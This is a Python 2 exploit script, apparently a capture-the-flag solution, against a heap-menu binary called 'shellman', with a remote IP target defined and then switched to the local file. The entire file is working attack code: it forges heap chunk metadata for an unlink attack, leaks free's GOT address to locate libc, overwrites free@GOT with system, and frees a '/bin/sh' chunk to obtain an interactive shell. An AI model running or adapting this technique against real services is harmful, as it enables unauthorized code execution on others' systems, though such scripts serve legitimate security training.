from zio import *
target = ('119.254.101.197', 10002)
target = "./shellman"
#target = './shellman'
def new_sc(io, sc):
  io.read_until('>')
  io.writeline('2')
  io.read_until(':')
  io.writeline(str(len(sc)))
  io.read_until(':')
  io.write(sc)
def edit_sc(io, index, new_sc):
  io.read_until('>')
  io.writeline('3')
  io.read_until(':')
  io.writeline(str(index))
  io.read_until(':')
  io.writeline(str(len(new_sc)))
  io.read_until(':')
  io.write(new_sc)
def delete_sc(io, index):
  io.read_until('>')
  io.writeline('4')
  io.read_until(':')
  io.writeline(str(index))
def list_sc(io):
  io.read_until('>')
  io.writeline('1')
  io.read_until('SHELLC0DE 0: ')
  data = io.read(16)
  print "data:", data
  return l64(data.decode('hex'))
def exp(target):
  #io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
  io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
  new_sc(io, 'a'*0x80) #0x603010
  new_sc(io, 'b'*0x80) #0x6030c0
  new_sc(io, '/bin/sh;'+'c'*0x78) #0x603170
  ptr_addr = 0x00000000006016d0
  #							  rax				  rdx
  payload = l64(0) + l64(0x81) + l64(ptr_addr-0x18) + l64(ptr_addr-0x10) + 'a'*0x60 + l64(0x80) + l64(0x90)
  edit_sc(io, 0, payload) # change *0x6016d0 = 0x6016b8
  delete_sc(io, 1)
  free_got = 0x0000000000601600
  payload2 = l64(0) + l64(1) +l64(0x80) + l64(free_got)
  edit_sc(io, 0, payload2)
  free_addr = list_sc(io)
  print hex(free_addr)
  #local
  system_addr = 0x00007FFFF7A5B640
  system_addr = 0x0000000000044C40 + free_addr - 0x0000000000082DA0
  '''
  libc_base = free_addr - 0x0000000000082DF0
  system_addr = libc_base + 0x0000000000046640
  '''
  edit_sc(io, 0, l64(system_addr))
  delete_sc(io, 2)
  io.interact()
exp(target)